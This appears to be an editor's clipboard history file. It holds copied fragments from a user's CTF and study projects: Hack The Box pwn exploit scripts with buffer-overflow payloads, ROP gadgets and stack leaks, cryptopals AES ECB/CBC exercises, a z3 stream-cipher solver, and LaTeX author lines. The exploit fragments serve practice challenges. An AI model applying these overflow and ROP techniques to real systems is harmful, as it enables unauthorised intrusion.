bc493ea7161fb461b52b266ac80c60f2|file:///home/neo/CTFs/volga2020/export/z3-export.py|162|8|v|python
	101, 102, 103, 104, 105, 106, 107, 108
97fa9f86669b5dc7858dd3103c255d33|file:///home/neo/CTFs/volga2020/export/server.py|38|13|V|python
	            # key = b'12345678'
bb5c6b091533f8f58d65e5ddd3935480|file:///home/neo/CTFs/volga2020/export/z3-export.py|87|17|V|python
	                self.regs[0] = self.clock_r(self.regs[0], self.br[0])
839976dd449ba3bcdba38cdcbb41f38a|file:///home/neo/CTFs/volga2020/export/z3-export.py|89|1|V|python
	            # self.z3_regs[0] = z3.If(self.z3_regs[3][10] == maj,
	            #         self.z3_regs[0] == self.clock_r(self.z3_regs[0], self.br[0]),
	            #         self.z3_regs[0] == self.z3_regs[0]
	            #         )
d9cf760db7bbfbc2bdfd4044662f92af|file:///home/neo/CTFs/volga2020/export/z3-export.py|88|13|V|python
	            # z3.If(z3.BitVecVal(1,6)==1,z3.BitVecVal(0,6),z3.BitVecVal(1,6)) + z3.BitVec('x',6)
1b85ae094d46a41f321a511da7544a5c|file:///home/neo/CTFs/volga2020/export/z3-export.py|90|13|V|python
	            # if self.z3_regs[3][3] == maj:
d2f61d63650b75b567fe35cc491fbb54|file:///home/neo/CTFs/volga2020/export/z3-export.py|93|13|V|python
	            # if self.z3_regs[3][7] == maj:
377d1f573d8339237e23a2596f5de8b9|file:///home/neo/CTFs/volga2020/export/z3-export.py|117|9|V|python
	        # if self.z3_regs[3][10] == maj:
8ba744ebb0bd83c10897c1d5f3f19ef1|file:///home/neo/CTFs/volga2020/export/z3-export.py|120|9|V|python
	        # if self.z3_regs[3][3] == maj:
a6ccdbe51f05126be5b30e221cea0b6e|file:///home/neo/CTFs/volga2020/export/z3-export.py|123|9|V|python
	        # if self.z3_regs[3][7] == maj:
afa23e86bbd3e5fe973fe17c950e4dd4|file:///home/neo/CTFs/volga2020/export/z3-export.py|153|1|V|python
	# key = [101, 102, 103, 104, 105, 106, 107, 108]
eb5c1399a871211c7e7ed732d15e3a8b|file:///home/neo/CTFs/volga2020/export/z3-export.py|147|17|v|python
	small
2f1bd8564f339033ebdb8af84cf3c801|file:///home/neo/CTFs/volga2020/export/z3-export.py|144|1|V|python
	s = z3.Solver()
	z3.set_param("parallel.enable", True)
	
	keyfile = open('keystream_bits.txt', 'r')
	lines = keyfile.read().splitlines()
	test_keystream = {}
	for i, line in enumerate(lines):
	    test_keystream[i] = line
	
	key = [0, 0, 0, 0, 0, 0, 0, 1]
	for i in test_keystream:
	    cipher = Cipher(key, i)
	    print(test_keystream[i])
	    bit_list = test_keystream[i]
	    for bit in bit_list:
	        test_bit, z3_bit = cipher.next_bit()
	        s.add(bit==z3_bit)
78d4e0f41c5b3779b7f82dc4889a69e3|file:///home/neo/cryptopals/set2/set2_sol.py|35|5|V|python
	    for i in range(16):h
ac439c4c25e44e9c565f99137d25d5f0|file:///home/neo/cryptopals/set2/set2_sol.py|58|1|V|python
	    # dec_file = open('set2/lyrics.txt', 'r')
	    # plaintext = bytearray(dec_file.read(), 'utf-8')
	    # key = b'YELLOW SUBMARINE'
	    # ciphertext = encrypt_aes_ecb(plaintext[:len(plaintext)- len(plaintext) % 8], key) 
	    # ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
	    # print(ciphertext)
f91fa0b829bc47a8dd0fb168b997f023|file:///home/neo/cryptopals/set2/set2_sol.py|56|27|v|python
	lyrics
2a25aa78bdd0e22896d1acc78490fdd4|file:///home/neo/cryptopals/set2/set2_sol.py|59|30|v|python
	ecb(plaintext[:len(plaintext)- len(plaintext) % 8], key) 
1c197853019d454a9b92a8bc18ad6c4d|file:///home/neo/cryptopals/set2/set2_sol.py|51|1|V|python
	    iv = b'\x00' * 16
122ee25f1b31689e8aadbe10ae516d8b|file:///home/neo/cryptopals/set2/set2_sol.py|22|15|v|python
	prev_cipher_block
2f12b30406565e334e62fef1cbae45e4|file:///home/neo/cryptopals/set2/set2_sol.py|21|30|V|python
	        print(prev_cipher_block)
	        print(plain_block)
d2dfecbf7d4abea401bb73dee4628cc7|file:///home/neo/cryptopals/set2/set2_sol.py|19|14|v|python
	len(plaintext) 
35912274b06d509d095ccae826d00b61|file:///home/neo/cryptopals/set2/set2_sol.py|29|5|V|python
	        print(plain_block)
423d3751300eca82b5e264819d229126|file:///home/neo/cryptopals/set2/set2_sol.py|23|1|V|python
	        xored_block = xor_bytes(prev_cipher_block, plain_block)
	        cipher_block = encrypt_aes_ecb(xored_block, key)
	        ciphertext += cipher_block
274b031affd72869f1a59c2513112bff|file:///home/neo/cryptopals/set2/set2_sol.py|54|1|V|python
	    enc_file = open('set2/10.txt', 'r')
ced4871693498a5133bba4e927925608|file:///home/neo/cryptopals/set2/set2_sol.py|54|22|v|python
	set2/10
fc8b7256604a8ff0504e3ad89073bfc1|file:///home/neo/cryptopals/set2/set2_sol.py|54|1|V|python
	    enc_file = open('test.txt', 'r')
f1f713c9e000f5d3f280adbd124df4f5|file:///home/neo/cryptopals/set2/set2_sol.py|77|21|v|python
	array
af889bed39db308a0c5a3c4197625285|file:///home/neo/cryptopals/set2/set2_sol.py|24|5|V|python
	    xored_block = b''
f2b471724f2d4b3e1d370ce4e3769cc0|file:///home/neo/cryptopals/set2/set2_sol.py|29|9|V|python
	        print(xored_block)
6fd48a522b444578bf473fc5c75bd802|file:///home/neo/CTFs/volga2020/export/keystream_bits.txt|1|1|V|text
	101011000011111010011000111010011011000001011000100110100100111100011001110111101101100000011101101100011110010110
e56000a55fea45f96fa86817a98d2376|file:///home/neo/cryptopals/set2/set2_sol.py|59|1|V|python
	    key = generate_random_key()
441156bbfce847dac99ff05949cef0b6|file:///home/neo/cryptopals/set2/set2_sol.py|68|5|V|python
	    print(len(key))
8cc7c7bd0885034494e6c36c2426719c|file:///home/neo/cryptopals/set2/set2_sol.py|67|5|V|python
	    key = generate_random_bytes(16)
b717e80a0bae9304a65e32d50a77290a|file:///home/neo/cryptopals/set2/set2_sol.py|63|1|V|python
	    pre_pad_size = random.randint(5,10)
	    pre_pad = generate_random_bytes(pre_pad_size)
36a515e7aba47774739a5b546848d316|file:///home/neo/cryptopals/set2/set2_sol.py|69|19|v|python
	uniform(0,1)
a4d61b86928522d0d311fec703c5499c|file:///home/neo/cryptopals/set2/set2_sol.py|90|1|V|python
	    # dec_file = open('set2/decrypted.txt', 'r')
	    # plaintext = bytes(dec_file.read(), 'utf-8')
	    # key = b'YELLOW SUBMARINE'
	    # iv = b'\x00' * 16
	    # ciphertext = encrypt_aes_cbc(plaintext, key, iv)
	    # ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
	    # print(ciphertext)
4662f0c3654da6318e95a2af00ac5f88|file:///home/neo/cryptopals/set2/set2_sol.py|81|2|V|python
	    key = b'YELLOW SUBMARINE'
60a696249c110574028c0b1adac291ed|file:///home/neo/cryptopals/set2/set2_sol.py|81|18|v|python
	encrypt_aes_cbc(plaintext, key, iv)
998bd9b181aa7fac604e01db2d756bd3|file:///home/neo/cryptopals/set2/set2_sol.py|67|8|V|python
	    print(pre_pad)
	    print(pad)
8ce252056b64e203e19b56d01e25e44f|file:///home/neo/cryptopals/set1/set1_sol.py|182|5|V|python
	    # ciphertext = ciphertext_bytes.decode('utf-8')
7a785484d795a312ef06d58130cbdd4d|file:///home/neo/cryptopals/set1/set1_sol.py|180|33|v|python
	_bytes
e6766870b43385f6470153b348e3cb28|file:///home/neo/cryptopals/set1/set1_sol.py|182|5|V|python
	    ciphertext = ciphertext_bytes
fd683d4e134e20fb6eb122b3a394e9aa|file:///home/neo/cryptopals/set2/set2_sol.py|78|9|V|python
	    if detect_aes_ecb(ciphertext):
	        print("Is ecb")
	    else: 
	        print("Is cbc")
4ef34647f98424d258333c5f99ffe0aa|file:///home/neo/cryptopals/set2/set2_sol.py|86|5|V|python
	    dec_file = open('set2/decrypted.txt', 'r')
ce30521b9fcd17f812620dc533e1f706|file:///home/neo/cryptopals/set2/set2_sol.py|86|17|v|python
	bytes(dec_file.read(), 'utf-8')
3224248213a5435ac0e6f2af3bd40577|file:///home/neo/cryptopals/set2/set2_sol.py|90|5|V|python
	    plaintext = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' 
0b273262b1d01c5d8376556f254bbb6a|file:///home/neo/cryptopals/set1/set1_sol.py|199|14|v|python
	hex_to_base64(line)
4cd156933ba89e5accc3785e25169952|file:///home/neo/cryptopals/set1/set1_sol.py|200|36|v|python
	,'utf-8'
ffb6ccb1ce42aa3970932eb45e24a84d|file:///home/neo/cryptopals/set1/set1_sol.py|200|9|V|python
	        print(ct)
a2e3bb8276b746422b760781b1888d71|file:///home/neo/cryptopals/set2/set2_sol.py|85|5|V|python
	    print()
c8c37a8b706e2061bd788e1c63144ff2|file:///home/neo/cryptopals/set2/set2_sol.py|76|9|V|python
	        print('ecb')
d2f3eb53d46466103b8370b06c66a9ac|file:///home/neo/cryptopals/set2/set2_sol.py|73|9|V|python
	        print("cbc")
f5102cb93d80a19ba2be44958fd5e64d|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|45|1|V|python
	line = io.recvline_contains("flag")
	io.recvline()
2bd79d9d070ff12ce60d086f9bc3883c|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|56|1|V|python
	io.sendline('5')
	line = io.recvline()
	log.info("Received: %s" % line)
531f03077ed08ff0c7a56608a4f5d569|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|55|1|V|python
	# io.recvuntil('memo:')
f687ff5ce4c336b2142393dd298bcc2f|file:///home/neo/hackthebox/pwn/diablos/exploit.py|47|10|V|python
	# OFFSET = cyclic_find(0x6161616c)
	# payload = "A" * OFFSET
	# io.sendline(payload)
d2c2bf62415a2bbb4e737d402b547c8b|file:///home/neo/hackthebox/pwn/diablos/exploit.py|46|1|v|python
	0x62616177
d4a973e303ec37692cc8923e3148eef7|file:///home/neo/hackthebox/pwn/diablos/exploit.py|11|25|v|python
	8080
5d5b0efb4da83b44ef4af7abbd487a88|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|44|5|V|python
	    piebase 0x4011b4
a6f2d70e898d7e54a9bb444e2974d114|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|54|12|v|python
	cyclic_find(0x706e6e72)
e20c316ed05c1ad9e3a5bfaf0fd96fd7|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|55|1|V|python
	io.recvuntil('hack me')
a35fe7f7fe8217b4369a0af4244d1fca|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|64|17|v|python
	5000
8a4d70e27e6bf9621dc40f90f761a1c5|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|45|1|V|python
	io.sendline(cyclic(1024))
814f506403d00dc9bfca0608da2f0f5c|file:///home/neo/CTFs/notes/pwn.md|32|17|v|markdown
	u64(io.recvline(False).ljust(8, '\x00'))
69b3420819fec505dc028a45c7c9422f|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|45|1|V|python
	log.info(line)
f285e911475dfcc7549664aaa4305ed1|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|45|1|V|python
	rsp_addr = u64(io.recvline().ljust(8, '\x00'))
38e506a1eae21e82a62e316ae639ff58|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|49|1|V|python
	cyclic(1024)
c71b2ddc40ae6079d859b98189f69f7c|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|47|1|v|python
	  401000:   5c                      
718605fae2567bd1f50432e39b18d70b|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|48|1|v|python
	  401001:   5f                      
50b9dbd0a6c0d7d737936565f730efbc|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|49|1|v|python
	  401002:   5e                      
f70289e0d041980608324f10bdfa0241|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|50|1|v|python
	  401003:   5d                      
df3f49a7648515129c96fccceef9ef41|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|51|1|v|python
	  401004:   5a                      
51eb4bc7c834d242412a7331f2fc2383|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|52|1|v|python
	  401005:   59                      
cacd0ccde30ffed390223dbb50912985|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|53|1|v|python
	  401006:   5b                      
db2b0a8127c76d69938a32801b4546c5|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|54|1|v|python
	  401007:   48 31 c0                
1f1e6c69ee12e51d4269b745334a06b3|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|55|1|v|python
	  40100a:   ff 67 01                
275312077e0116ecb090d4e3d49c7919|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|51|2|v|python
	 401099:   0f 05                   
5d5abbbcc5e22156144be6f734cb0b4f|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|52|1|v|python
	  40109b:   48 83 c4 08             
4b04978efea1db8065a08fcc0d1a21dd|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|53|1|v|python
	  40109f:   ff 64 24 f8             
d46fc3a5fa4b51bea100b321c2e4301a|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|51|1|v|python
	syscall; add rsp,0x8; jmp QWORD PTR [rsp-0x8]
3bc2dedb51add9b02e7cf30de135c30a|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|66|1|V|python
	payload += p64(POP_GADGETS)
c132ac68ff6c4e3e3abd2d7930004bb5|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|67|1|V|python
	# payload += 
62d58d14b3cd4cb9be67a20b01917b2d|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|42|1|V|python
	    b 0x40106d
1f934e7da11f205be6df98c7e1aac47f|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|64|17|v|python
	 (OFFSET - 8)
eacef2e49783bddf0c00a3bb24432011|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|64|15|V|python
	payload = "A" * 1000
	io.sendline(payload)
040e50e58711cf9e240caeef20ce0288|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|62|1|V|python
	payload = "A" * 1000
	io.send(payload)
bcc76352625d3aec6f8fc437a0aa4776|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|66|1|V|python
	payload = p64(POP_GADGETS)
6bed8bfd8f8fc2a37029b0104e12028c|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|62|1|V|python
	rsp_addr = u64(io.recv().ljust(8, '\x00'))
	log.info("Stack address: %#x" % rsp_addr)
	payload = "A" * 1000
	io.send(payload)
da222737d2b048a2b1ef6ebbb1b8b7d0|file:///home/neo/Documents/epl448/disaster-tweets/sample/sample_nlp.py|5|25|^v|python
	/kaggle/input/nlp-getting-started/t
5e0a30b078fb180a3b1da178124147cb|file:///home/neo/Documents/epl448/disaster-tweets/sample/sample_nlp.py|37|34|^v|python
	l/kaggle/input/nlp-getting-started/s
293424dcff063e9a46aac71eef5895cb|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|64|1|V|python
	io.recv()
aba90025fed46f1caa25d60916416696|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|37|1|V|python
	    b *0x40109b
544c1cded78fd45ab464116a40b28b69|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|30|21|v|python
	int(address, 16)
7bf96d8937ca25c3f9a5c737ab701681|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|58|16|v|python
	POP_RDI
9fb8bdb564b80f902307bfc17b962ff7|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|29|1|V|python
	    print(address)
903afa9ce2cb33dab21235a96570e8a5|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|31|5|V|python
	    print(address_str)
aac69c123c6324c81f2793715f18f4c1|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|32|5|V|python
	    print(address_bytes)
7d290effa4dc81146e0548de0f34dc1f|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|36|13|v|python
	print(byte)
37f0cce6c2582ad75381e2849408e22c|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|48|5|V|python
	    pie breakpoint 0x4011b4
ad2ddf52f1777f174d8e54bf4923c150|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|76|12|v|python
	"C" * 8
34ed7bf203c631f916cb4c715eead40b|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|39|13|V|python
	            print(val) 
b102726ad7f3c502ee226a9f9b888e5a|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|38|21|v|python
	mod += 
7bc1be694e088fb0bd327c16548c09ef|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|43|20|V|python
	                    
2098873b67bdc4a0bb3f08bc48ed2afd|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|44|13|v|python
	print(val)
b60e113819abb04fb5be3ba27a568dd0|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|46|5|V|python
	    print(p64(mod))
5218855708a63f38e00cdf14c7899e93|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|47|5|V|python
	    print(p64(hex(newaddr)))
636d4db32a1a3f11250e9861dbb4d38b|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|47|5|V|python
	    print(newaddr)
6e4108b201f72870601412018fafde76|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|47|5|V|python
	    print(p64(newaddr))
b1067ee60bcd9f351f662fd35dd0cc93|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|49|1|V|python
	99130821
460bb3db1706563f951b7e6b67334b78|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|85|12|v|python
	'\x70' * 8
9423907599044dfc431b5c9deda50fb1|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|85|27|v|python
	b'A' * 8
57fd408f3af4aaaa4cc46a22071e2a32|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|71|1|V|python
	modify_address(MAIN_ADDR)
a265f8fcf2d5da8923c3c95a51eba9d1|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|71|22|v|python
	"AAAAAAAAA"
bb4b79b80269e830c0b38fb6d559e9ed|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|71|1|V|python
	print modify_address(0x6161616161)
4455dce21040196fae2226bd519ce7b6|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|83|1|V|python
	# payload += p64(POP_RDI)
	# payload += p64(PRINTF_GOT)
	# payload += p64(PRINTF_PLT)
	# payload += p64(MAIN_ADDR)
29a1477821cefd8a30927bdf3c6a3ea4|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|82|16|v|python
	modify_address(0x4141414141414141
006bb5285ee4105edea4343c24632622|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|85|1|V|python
	# payload += "A" * 8
99654072e9b9d1021dd412dcc5d8ceb6|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|46|1|V|tex
	\institute{Anonymous Institute}
604deab38d85dbd2bf221989a6faf328|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|47|8|v|tex
	adiony01
015c2942b673fe5730b8977d20ad95b7|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|48|1|V|tex
	\and
	Research Centre on Interactive Media, Smart Systems and Emerging Technologies, Constantinou Paleologou 1, Tryfon Building, Nicosia 1011, Cyprus,
	\email{v.vassiliades@rise.org.cy}\\
ff6a2962f3f5e1bee43b59ab12ba5455|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|45|1|V|tex
	\author{Anonymous Submission}
2b74f8cb4de1b54713c93992d73dcfa2|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|45|9|v|tex
	Antreas
036c44e7c31b4df9e748337e8ec9d73f|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|45|9|v|tex
	Dionysiou
c56d95c1653171ea9818928700220060|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|46|1|V|tex
	Vassilis Vassiliades\inst{2} \and
86276304c368f4277c2b6558c6bf3306|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|44|23|v|tex
	Advanced Authentication for the Web 
566a1eb69fd7793da99cff16880c00df|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|44|1|V|tex
	\title{{\tt auth.js:} Advanced Authentication for the Web }
0dcb28fb7a2169811f54f9758c2e726a|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|46|9|v|tex
	Antreas Dionysiou
8e976f17ec3524381a89dcefdc232ee0|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|46|35|v|tex
	\orcidID{0000-0002-6517-8462} \and
16fd5d469c6b1750ae891f1a9eff3df2|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|49|1|V|python
	0x0000000000401062:
fc2295229addbd958823ddb3ee194d83|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|48|1|V|python
	RET_GADGET = rop.find_gadget("ret").address
367aba2b797b46c7d1efa194816bfe7b|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|78|1|V|python
	# log.info("Stack address: %#x" % rsp_addr)
9867ed4f53f6be489598f8bcf1b19c86|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|66|33|v|python
	rsp_addr
c14d5e8dc72eab717fa423e2bb93a42d|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|67|1|V|python
	log.info('Got RSP: {}'.format(hex(RSP)))
462eebd80a2bb20ea5218d6e7b1d151a|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|37|1|V|python
	    b *0x401084
a1969e82c71951e64218ef78d1044242|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|1049|1|V|python
	    t5a_digit_i_subset_mean = np.mean(t5a_digit_i_subset, axis=0)
56ba32e65014625d9d337d4881a2ff19|file:///home/neo/hackthebox/pwn/noreturn/exploit.py|14|24|v|python
	.path] + argv, *a, **kw
9d6a063702a0a5ca2ca4482a147b8bdb|file:///home/neo/cryptopals/set2/set2_sol.py|59|1|V|python
	def encryption_oracle(plaintext: bytes) -> bytes:
	    if not isinstance(plaintext, bytes):
	        raise TypeError
	    key = generate_random_bytes(16)
	    pre_pad_size = random.randint(5,10)
	    pre_pad = generate_random_bytes(pre_pad_size)
	    pad_size = random.randint(5,10)
	    pad = generate_random_bytes(pad_size)
	    rand = random.randint(0,1)
	    plaintext = pre_pad + plaintext + pad
	    if len(plaintext) % 16 != 0:
	        plaintext += generate_random_bytes(16 - len(plaintext) % 16)
	    ciphertext = b''
	    if rand == 0:
	        ciphertext = encrypt_aes_cbc(plaintext, key, generate_random_bytes(16))
	    else:
	        ciphertext = encrypt_aes_ecb(plaintext, key)
	    return ciphertext
a4c11536b296bd0a4edb0b360791c49d|file:///home/neo/cryptopals/set2/set2_sol.py|87|5|v|python
	encryption_oracle
c1dc0344ac5b6c4dd2e8e12e03b13870|file:///home/neo/cryptopals/set2/set2_sol.py|100|5|V|python
	    if rand == 0:
356eb56d8acf2c1c32d5cfdd1e1a6b0a|file:///home/neo/cryptopals/set2/set2_sol.py|100|9|V|python
	        ciphertext = encrypt_aes_cbc(plaintext, key, generate_random_bytes(16))
6a09e4cd399e9effc3c300450378b3fb|file:///home/neo/cryptopals/set2/set2_sol.py|94|5|V|python
	    pad = generate_random_bytes(pad_size)
6a32e1264b41c64643f72671ac96f19a|file:///home/neo/cryptopals/set2/set2_sol.py|91|5|V|python
	    pre_pad_size = random.randint(5,10)
5b98fcc46318a8f7c011052bcd833b26|file:///home/neo/cryptopals/set2/set2_sol.py|91|5|V|python
	    pre_pad = generate_random_bytes(pre_pad_size)
0530df4888bb4fa0e5fd55e3ee786dca|file:///home/neo/cryptopals/set2/set2_sol.py|91|5|V|python
	    pad_size = random.randint(5,10)
31572d8ff9d3c56610623ec3c6224007|file:///home/neo/cryptopals/set2/set2_sol.py|91|5|V|python
	    rand = random.randint(0,1)
3605c5aba29e22a69daa3abf33b42be7|file:///home/neo/cryptopals/set2/set2_sol.py|91|17|v|python
	pre_
c748ac360e013137dd324398535baf35|file:///home/neo/cryptopals/set2/set2_sol.py|69|1|V|python
	    if len(plaintext) % 16 != 0:
	        plaintext += generate_random_bytes(16 - len(plaintext) % 16)
fa5be8112c66b5bbb0ef09c7b6753bab|file:///home/neo/cryptopals/set2/set2_sol.py|94|9|v|python
	plaintext += generate_random_bytes(16 - len(plaintext) % 16)
3a9d789f3a5783a51aea2f5d2828ca0e|file:///home/neo/cryptopals/set2/set2_sol.py|93|5|V|python
	    if len(plaintext) % 16 != 0:
f7e0a4fa5bfb3ca70f8b1350e1dd694d|file:///home/neo/cryptopals/set2/set2_sol.py|69|9|V|python
	        # plaintext += generate_random_bytes(16 - len(plaintext) % 16)
31472ee9a9cb6b9849b059422ddc590a|file:///home/neo/cryptopals/set2/set2_sol.py|99|5|V|python
	    detected = False
0c240ab3089ac5d0396aa67c5ef5c698|file:///home/neo/cryptopals/set2/set2_sol.py|102|11|v|python
	not detected
2be4165ed21caefd991f01a37bf3288f|file:///home/neo/cryptopals/set2/set2_sol.py|108|28|V|python
	            print(prev_cipher_len)
	            print(cipher_len)
8d7deab83b7e5e97b11b0222c7772613|file:///home/neo/cryptopals/set2/set2_sol.py|108|13|V|python
	            return len(plaintext)
3b2a280b1d47f861ef6f552884ae6389|file:///home/neo/cryptopals/set2/set2_sol.py|113|5|V|python
	    w
3ac15ce222ff5fd3f6789832c17654cf|file:///home/neo/cryptopals/set2/set2_sol.py|104|1|V|python
	    while not first_hit:
	        first_hit_len += 1
	        ciphertext = ecb_oracle(plaintext, key)
	        cipher_len = len(ciphertext)
	        if cipher_len > prev_cipher_len:
	            first_hit = True
	        else:
	            prev_cipher_len = cipher_len
7294516a88f6b4b08af491a9132c9866|file:///home/neo/cryptopals/set2/set2_sol.py|113|11|v|python
	not first_hit
ddf3a9105ad7ef3bfe795a3391ecc006|file:///home/neo/cryptopals/set2/set2_sol.py|118|13|V|python
	            first_hit = True
e387c873eacb5f8f3d8a5e62652bba3a|file:///home/neo/cryptopals/set2/set2_sol.py|114|9|V|python
	        first_hit_len += 1
4deb8e1bcf0f4becd48699c46dfb1996|file:///home/neo/cryptopals/set2/set2_sol.py|117|35|v|python
	- first_hit_len
a958c4c45d836bff3d09456cd362959c|file:///home/neo/cryptopals/set2/set2_sol.py|110|9|V|python
	        else:
b8c23f158b3f8d432b6bfe0ba0d31591|file:///home/neo/cryptopals/set2/set2_sol.py|110|13|V|python
	            prev_cipher_len = cipher_len
	            plaintext += b'A'
0b7d728601d9d44913027c9f8a871ce9|file:///home/neo/cryptopals/set2/set2_sol.py|109|9|V|python
	        plaintext += b'A'
e3aa82c77c77fcd27dcc30dc7030f3c6|file:///home/neo/cryptopals/set2/set2_sol.py|108|9|V|python
	        prev_cipher_len = cipher_len
	        plaintext += b'A'
036519407094704758244de6ff426106|file:///home/neo/cryptopals/set2/set2_sol.py|123|15|v|python
	Typerror
884d12c4c4157f510ceabf7eda6b0acd|file:///home/neo/cryptopals/set2/set2_sol.py|130|38|V|python
	    block_size = detect_block_size(key)
	    print(block_size)
9c4ab6e4a140f94aa111df5fa6614ce5|file:///home/neo/cryptopals/set2/set2_sol.py|82|17|v|python
	Detected 
495ede3d060199c507c8708600b51784|file:///home/neo/cryptopals/set2/set2_sol.py|84|17|v|python
	Detected
ee9b51e1d679e38e779e9c7b4d68f4f9|file:///home/neo/cryptopals/set2/set2_sol.py|125|5|V|python
	    mode = detect_mode 
9e94ea7cc7ed8e3c1b89105d5f86f7f5|file:///home/neo/cryptopals/set2/set2_sol.py|132|5|V|python
	    plaintext = b'A' * 50
	    ciphertext = encryption_oracle(plaintext) 
	    ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
4fde2233338983e52d01205f257112e7|file:///home/neo/cryptopals/set2/set2_sol.py|82|5|V|python
	    ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
	    ciphertext = base64.b64decode(ciphertext_base64)
2a60936e68c4a859d25ba69abe871ccd|file:///home/neo/cryptopals/set2/set2_sol.py|133|24|v|python
	bytes(ciphertext, 'utf-8'
13080579f4b09a459d2e895d5e6e709a|file:///home/neo/cryptopals/set2/set2_sol.py|78|14|V|python
	    if not isinstance(ciphertext_base64, bytes):
	        raise TypeError
d4ffbe71773c9054de1e1408b3ac6c24|file:///home/neo/cryptopals/set2/set2_sol.py|77|17|v|python
	ciphertext_base64: bytes
c863b6f07a28f48a816c10197d6db070|file:///home/neo/cryptopals/set2/set2_sol.py|138|1|V|python
	    # ciphertext = codecs.encode(ciphertext, 'base64').decode('utf-8')
	    # mode = detect_mode(bytes(ciphertext, 'utf-8'))
e7657416d0424ca07b8a602701c0af1a|file:///home/neo/cryptopals/set2/set2_sol.py|129|5|V|python
	    mode = detect_mode(base64.b64encode(plaintext))
3c1e523b460c478c64bd1a77d9b97e0b|file:///home/neo/cryptopals/set2/set2_sol.py|129|5|V|python
	    # print(mode)
6a040f3c6c8f4c73b75d01e2afe37fa5|file:///home/neo/cryptopals/set2/set2_sol.py|131|1|V|python
	def decrypt_block_ecb(key: bytes, block: bytes, block_len: int) -> bytes:
eb23d184fbd8b001a3ab1ff60c8e5204|file:///home/neo/cryptopals/set2/set2_sol.py|132|5|V|python
	    print(total_blocks)
51f729ca4d7aeb3de0283bc4dd33b5ec|file:///home/neo/cryptopals/set2/set2_sol.py|133|5|V|python
	    print(cipher_blocks)
